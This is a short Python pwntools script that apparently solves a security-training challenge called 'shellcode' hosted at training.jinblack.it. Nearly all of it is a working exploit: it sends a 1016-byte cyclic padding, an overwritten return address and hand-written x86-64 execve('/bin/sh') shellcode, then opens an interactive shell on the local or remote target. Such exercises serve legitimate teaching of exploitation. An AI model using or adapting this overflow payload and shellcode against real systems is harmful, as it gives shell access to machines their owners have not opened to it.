from pwn import *
import binascii
# context.terminal = [ 'tmux', 'splitw' , '-h']
HOST = "training.jinblack.it"
PORT = 2001
if args.REMOTE:
    r = remote(HOST, PORT)
elif args.GDB:
    r = process("./shellcode")
    gdb.attach(r,"""
    b* 0040069b
    b* 004006f1
    b* 0x400722
    c
    """)
    input("wait for gdb")
else:
    r = process("./shellcode")

r.recvuntil("What is your name?")

# jmp    0x16
# pop    edi
# dec    eax
# mov    esi,edi
# dec    eax
# add    esi,0x8
# dec    eax
# mov    edx,esi
# dec    eax
# mov    eax,0x3b
# syscall
# call   0x2
shellcode = b"\xEB\x14\x5F\x48\x89\xFE\x48\x83\xC6\x08\x48\x89\xF2\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05\xE8\xE7\xFF\xFF\xFF"
shellcode += b"/bin/sh\x00"
shellcode += b"\x00"*8

payload = cyclic(1016) + p64(0x601480) + shellcode 

r.send(payload)
r.interactive()
